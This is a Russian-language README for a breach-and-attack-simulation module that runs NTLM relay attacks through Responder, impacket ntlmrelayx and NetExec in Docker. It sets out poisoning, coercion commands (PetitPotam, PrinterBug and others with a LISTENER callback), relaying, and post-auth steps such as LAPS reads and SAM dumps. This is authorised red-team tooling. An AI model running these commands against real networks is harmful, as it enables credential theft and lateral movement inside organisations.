# btc-module-relay-nxc-impckt-rspndr

Модуль BAS (Breach and Attack Simulation) для эмуляции NTLM Relay атак. Оркестрирует **Responder** (passive poisoning), **impacket ntlmrelayx** (relay-движок) и **NetExec (nxc)** (coercion + post-auth), изолируя все сторонние инструменты внутри Docker-контейнеров.

---

## 0. Безопасность

Этот инструмент предназначен **исключительно** для:
- Авторизованного пентестинга
- Breach and Attack Simulation (BAS)
- Red Team операций с письменного разрешения заказчика

Запуск против систем без явного согласия является нарушением закона.

---

## 1. Общая концепция

В типичном NTLM Relay сценарии одновременно работают несколько ролей:

- **Passive Poisoner** — Responder отравляет LLMNR/NBT-NS/mDNS/WPAD, заставляя жертв резолвить имена на наш IP.
- **Active Coercer** — NetExec принуждает целевые машины подключиться к listener (PetitPotam, PrinterBug и др.).
- **Listener + Relay** — ntlmrelayx ловит NTLM и релеит к целевым сервисам.
- **Post-Auth Action** — NetExec выполняет проверочные действия после успешного relay.

`btc-module-relay-nxc-impckt-rspndr` объединяет эти роли в едином Python-оркестраторе с чётким разделением ответственности: сложные протокольные операции делегированы зрелым инструментам (impacket/netexec), а логика pipeline, состояния сессий и аудит реализованы в чистом Python с использованием Poetry и docker-py.

---

## 2. Архитектура

```text
┌──────────────────────────────────────────────────────────────────────────────┐
│                         Orchestrator (Python + Poetry)                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  ┌──────────────┐  │
│  │   Config     │  │   Session    │  │   Controllers    │  │   Pipeline   │  │
│  │  (Pydantic)  │  │   Registry   │  │ (docker-py wrprs)│  │  Executors   │  │
│  └──────────────┘  └──────────────┘  └──────────────────┘  └──────────────┘  │
│         │                   │                    │                  │        │
│         ▼                   ▼                    ▼                  ▼        │
│  ┌──────────────────────────────────────────────────────────────────────┐    │
│  │                    JSONL Audit Log (sessions.jsonl)                  │    │
│  └──────────────────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────────────────┘
           │                                    │
           ▼                                    ▼
┌─────────────────────────────┐      ┌──────────────────────────────┐
│  Responder                  │      │  NetExec (nxc) ephemeral     │
│  Docker container (detached)│      │  Docker containers (--rm)    │
│  Network: host              │      │  Network: host               │
│  Config: auto-generated     │      │  Volume: ./ (ro)             │
│  Responder.conf             │      └──────────────────────────────┘
│  SMB=Off, HTTP=Off          │
└─────────────────────────────┘
┌─────────────────────────────┐
│  impacket-ntlmrelayx        │
│  Docker container (detached)│
│  Network: host              │
│  Volumes: ./loot, ./logs    │
└─────────────────────────────┘
```

### 2.1. Оркестратор

Написан на Python 3.11+, управляется через CLI (`btc-relay-rspndr`). Основные задачи:

1. **Чтение конфигурации** — YAML-файл валируется Pydantic-моделями.
2. **Управление Docker-контейнерами** — через `docker-py` SDK.
3. **Session Registry** — хранит состояние каждой NTLM-сессии.
4. **Аудит** — все события (coerce, relay, post-auth) пишутся в `sessions.jsonl`.

### 2.2. ntlmrelayx Controller

`controller/ntlmrelayx_ctrl.py` управляет жизненным циклом фонового контейнера:

- **Старт**: `docker run -d --network host --name btc-relay-ntlmrelayx ...`
- **Log Tailing**: stdout ntlmrelayx перенаправляется в `./logs/ntlmrelayx.log` (shared volume). Оркестратор в фоновом потоке tail'ит этот файл и парсит события (успешный relay, захваченные хеши).
- **Стоп**: graceful shutdown через `docker stop` + `docker rm`.

### 2.3. nxc Controller

`controller/nxc_ctrl.py` — универсальная обёртка для запуска эфемерных контейнеров NetExec:

- **Coerce**: `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<callback> [METHOD=PetitPotam|PrinterBug|DFSCoerce|ShadowCoerce|MSEven]`
- **Post-Auth**: `nxc <protocol> <target> -u <user> -H <hash> [--shares | --users | -M <module>]`

Каждый вызов — это `docker run --rm`, что гарантирует чистоту окружения и отсутствие состояния между запусками.

### 2.4. Coercion через `nxc coerce_plus`

Вместо устаревшего модуля `coerce` проект использует **`coerce_plus`** — единый nxc-модуль, объединяющий 5 техник принуждения к аутентификации:

| Метод | RPC-интерфейс | Описание |
|-------|--------------|----------|
| `PetitPotam` | MS-EFSR | EfsRpcOpenFileRaw |
| `PrinterBug` | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx |
| `DFSCoerce` | MS-DFSNM | NetrDfsAddStdRoot / NetrDfsRemoveStdRoot |
| `ShadowCoerce` | MS-FSRVP | IsPathSupported / IsPathShadowCopied |
| `MSEven` | MS-EVEN | ElfrOpenBELW |

**Основные режимы работы:**

```bash
# Сканирование (LISTENER=localhost, без сетевого трафика)
nxc smb <target> -u '' -p '' -M coerce_plus

# Coerce с callback к нашему listener
nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>

# Конкретный метод
nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> METHOD=PetitPotam

# Все методы подряд, даже если один уже сработал
nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
```

В конфиге проекта (`config.yaml`) задаётся список `coerce.methods` и флаг `coerce.always`. Если указать `coerce_plus` или `all` — nxc сама переберёт все доступные методы.

---

## 3. Поток данных (Data Flow)

```
Phase 1: Passive Poisoning + Active Coercion
────────────────────────────────────────────
Responder ──► LLMNR/NBT-NS/WPAD poisoning ──► Target Machine
                                                    │
Orchestrator ──► nxc Docker (coerce_plus) ──► Target Machine
                                                    │
                                                    ▼
Phase 2: Capture                               SMB/HTTP auth
─────────────────                                    │
Target Machine ──► ntlmrelayx (listener) ◄───────────┘
                       │
                       ▼
Phase 3: Relay    ntlmrelayx relays NTLM to target service
─────────────────       │
                        ▼
              Relay Target (SMB/LDAP/HTTP/...)
                        │
                        ▼
Phase 4: Detection & Post-Auth
──────────────────────────────
ntlmrelayx log ◄── Orchestrator parses success
                       │
                       ▼
              SessionRegistry.transition(RELAY_SUCCESS)
                       │
                       ▼
              Post-Auth Pipeline (ThreadPool)
                       │
              ┌────────┴────────┬──────────────┬──────────┐
              ▼                 ▼              ▼          ▼
         nxc smb shares   nxc ldap users   nxc winrm   ...
              │                 │              │
              └─────────────────┴──────────────┘
                            │
                            ▼
                    JSONL Audit Log
```

### Пошагово

1. **Orchestrator** читает `config.yaml` и стартует `Responder` (passive poisoning) и `ntlmrelayx` (listener + relay) в detached-контейнерах.
2. **Responder** отравляет LLMNR/NBT-NS/mDNS/WPAD запросы в сегменте, перенаправляя жертв на IP атакующего.
3. **Coerce Pipeline** в несколько потоков обходит `coerce.targets`, запуская nxc `coerce_plus`. Жертвы начинают аутентифицироваться на listener.
4. **ntlmrelayx** перехватывает NTLM (Type 1/2/3), релеит их к `targets_relay.txt`. Логи пишутся в `./logs/ntlmrelayx.log`.
5. **Log Parser** (фоновый поток) обнаруживает успешный relay, создаёт/обновляет сессию в `SessionRegistry` со статусом `RELAY_SUCCESS`.
6. **Post-Auth Pipeline** (отдельный ThreadPool) для каждой такой сессии запускает настроенные nxc проверки по всем протоколам (smb, ldap, winrm, mssql, ssh, rdp).
7. **Результаты** всех этапов (Responder poison events, coerce stdout, relay metadata, post-auth parsed output) дописываются в `sessions.jsonl`.

---

## 4. Жизненный цикл сессии (State Machine)

Каждая операция над целью порождает `RelaySession` с уникальным ID.

```
PENDING
   │
   ├─► (coerce запущен) ───────────────┐
   │                                    │
   └─► (Responder poison event) ────────┤
   │                                    ▼
   │                               COERCING
   │                                    │
   │                                    ▼ (NTLM Type3 пойман listener'ом)
   └──────────────────────────────► CAPTURED
                                         │
                                         ▼ (ntlmrelayx начал relay)
                                    RELAYING
                                         │
            ┌────────────────────────────┴────────────────────────────┐
            │                                                         │
            ▼                                                         ▼
      RELAY_SUCCESS  ──► POST_AUTH ──► COMPLETED                  FAILED
```

| Статус | Описание |
|--------|----------|
| `PENDING` | Сессия создана (через coerce или Responder poison) |
| `COERCING` | nxc coerce отправлен к цели |
| `CAPTURED` | ntlmrelayx получил NTLM-авторизацию |
| `RELAYING` | ntlmrelayx пересылает учётные данные к relay target |
| `RELAY_SUCCESS` | Relay прошёл успешно, identity известна |
| `POST_AUTH` | Выполняются проверочные действия через nxc |
| `COMPLETED` | Весь pipeline завершён, результаты в JSONL |
| `FAILED` | Любой этап завершился ошибкой |

---

## 5. Docker-стратегия

### Почему именно так?

- **Impacket и NetExec** имеют пересекающиеся, но несовместимые зависимости (разные версии `impacket`, `pyasn1`, `cryptography`). Запуск в изолированных контейнерах решает конфликты.
- **Host network** необходим, потому что `ntlmrelayx` должен слушать порты 445/80/5985 на реальном интерфейсе машины, чтобы жертвы могли к нему подключиться. Bridge-сеть не подходит для SMB coercion сценариев.
- **Ephemeral nxc** (`--rm`) гарантирует, что каждый запуск начинается с чистого листа, без побочных эффектов от предыдущих команд.

### Volumes

| Путь хоста | Путь в контейнере | Назначение |
|------------|-------------------|------------|
| `./loot` | `/loot` | SAM dumps, hashes, SOCKS-данные от ntlmrelayx |
| `./logs` | `/logs` | Логи ntlmrelayx для tail'инга оркестратором |
| `./logs` | `/opt/responder/logs` | Poisoner логи Responder |
| `./` (ro) | `/workspace` | Таргет-файлы, вордлисты для nxc |

> **Примечание:** `Responder.conf` генерируется оркестратором автоматически и копируется в контейнер через `put_archive`. Не требуется ручное монтирование директории `/opt/responder`.

---

## 6. Конфигурация

Конфигурация задаётся в YAML-файле (по умолчанию `config.yaml`).

```yaml
project_name: "btc-module-relay-nxc-impckt-rspndr"
log_level: "INFO"
output_jsonl: "sessions.jsonl"

# Docker images и сетевая политика
docker:
  impacket_image: "btc-relay/impacket:latest"
  netexec_image: "btc-relay/netexec:latest"
  responder_image: "btc-relay/responder:latest"
  network_mode: "host"
  loot_dir: "./loot"
  logs_dir: "./logs"
  responder_config_dir: "./responder"

# Passive poisoning via Responder
responder:
  enabled: true
  interface: "eth0"
  wpad: true
  dns: true

# Relay engine: impacket ntlmrelayx
ntlmrelayx:
  enabled: true
  interface_ip: "0.0.0.0"
  smb_port: 445
  http_port: "80"
  wcf_port: 9389
  raw_port: 6666
  rpc_port: 135
  targets_file: "./targets_relay.txt"   # Файл с IP для relay
  command: null                         # Команда для exec после relay
  smb2support: true
  socks: false
  keep_relaying: true
  no_winrm_server: false

# Coercion: заставляем жертв аутентифицироваться
coerce:
  enabled: true
  methods:
    - "coerce_plus"
  targets:
    - "192.168.1.10"
  callback_host: "192.168.1.5"   # IP хоста с listener'ом
  always: false
  delay_between: 5.0
  workers: 4

# Post-auth: что проверяем после успешного relay
post_auth:
  enabled: true
  protocols:
    smb:
      enabled: true
      commands: ["--shares", "--users"]
      modules: []
    ldap:
      enabled: true
      commands: ["--users"]
      modules: ["laps", "bloodhound"]
    winrm:
      enabled: false
      commands: []
      modules: []
    mssql:
      enabled: false
      commands: []
      modules: []
    ssh:
      enabled: false
      commands: []
      modules: []
    rdp:
      enabled: false
      commands: []
      modules: []
  workers: 4
```

---

## 7. Установка и запуск

### Требования

- Python 3.11+
- Poetry (`pip install poetry`)
- Docker (Linux, с поддержкой `host` network mode)

### Production Deployment

**Для развёртывания в лаборатории заказчика** см. подробную инструкцию:

📄 **[DEPLOY.md](DEPLOY.md)** — требования к хосту, настройка сети, пошаговый запуск, troubleshooting.

### Быстрый старт (для разработки)

```bash
cd btc-module-relay-nxc-impckt-rspndr
poetry install

# Сборка образов
docker build -t btc-relay/impacket:latest docker/impacket
docker build -t btc-relay/netexec:latest docker/netexec
docker build -t btc-relay/responder:latest docker/responder

# Подготовка targets
echo -e "smb://192.168.1.20\nsmb://192.168.1.21" > targets_relay.txt

# Редактировать config.yaml:
#   - responder.interface (реальный интерфейс, не eth0)
#   - coerce.callback_host (IP этой машины)
#   - coerce.targets (жертвы coercion)
#   - post_auth.protocols

# Запуск
poetry run btc-relay-rspndr start -c config.yaml
```

### CLI

```bash
poetry run btc-relay-rspndr --help
# Commands:
#   start   Запуск оркестратора (responder + coerce + relay + post-auth)
#   status  Проверка статуса responder и ntlmrelayx контейнеров
#   stop    Принудительная остановка всех контейнеров
```

---

## 8. Расширение функциональности

### Добавить новый coerce-метод

1. Добавить имя метода в `coerce.methods` в `config.yaml`.
2. В `controller/nxc_ctrl.py::coerce()` изменить формирование `-o LISTENER=...` или добавить отдельную логику для метода.

### Добавить новый post-auth чек

1. В `config.yaml` добавить команду или модуль в `post_auth.protocols.<protocol>`.
2. Если нужен парсер специфического вывода — добавить функцию в `parser/nxc_output.py`.
3. В `pipeline/post_auth.py::_parse()` добавить условие вызова нового парсера.

### Изменить поведение ntlmrelayx

Модифицировать `controller/ntlmrelayx_ctrl.py::_build_command()` — добавить/убрать флаги impacket (например, `--remove-mic`, `--delegate-access`, `--adcs`).

---

## 9. Ограничения

- **Host network** работает только на Linux. На macOS/Windows Docker Desktop `host` network не поддерживает проброс портов в хост — потребуется `port` mapping с ограничениями.
- **NXC coerce модуль** доступен не во всех версиях NetExec. Если метод отсутствует, nxc вернёт ошибку — обрабатывайте через логи.
- **Парсеры** основаны на эвристике и regex. При изменении формата вывода nxc или ntlmrelayx парсеры могут потребовать корректировки.
